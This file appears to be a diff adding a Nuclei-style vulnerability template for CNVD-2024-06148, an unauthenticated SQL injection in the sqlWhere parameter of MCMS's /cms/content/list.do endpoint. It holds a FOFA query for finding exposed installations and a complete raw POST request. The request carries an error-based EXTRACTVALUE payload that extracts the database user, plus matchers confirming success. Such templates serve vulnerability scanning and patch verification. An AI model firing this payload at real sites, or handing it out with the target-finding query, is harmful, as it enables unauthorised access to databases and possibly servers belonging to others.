@@ -1,0 +1,33 @@
+id: CNVD-2024-06148
+
+info:
+  name: "铭飞CMS content 接口sqlWhere参数SQL注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"
+      在未实施充分输入验证机制的情况下，攻击者可通过构造恶意SQL语句，在无需身份验证的条件下触发content/list.do接口的sqlWhere参数注入漏洞，从而实现对数据库敏感信息的非法访问，并可能进一步扩展为服务器权限控制漏洞。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/140300863
+  tags: 铭飞MCMS
+
+
+
+http:
+- raw:
+  - |
+    POST /cms/content/list.do HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    sqlWhere=[{"action"%3a"","field"%3a"1+AND+EXTRACTVALUE(4095,CONCAT(0x7e,(select user()),0x7e))","el":"eq","model":"contentTitle","name":"123","type":"input","value":"a"}]
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'java.sql.SQLException: XPATH'
+  - type: status
+    status:
+    - 500
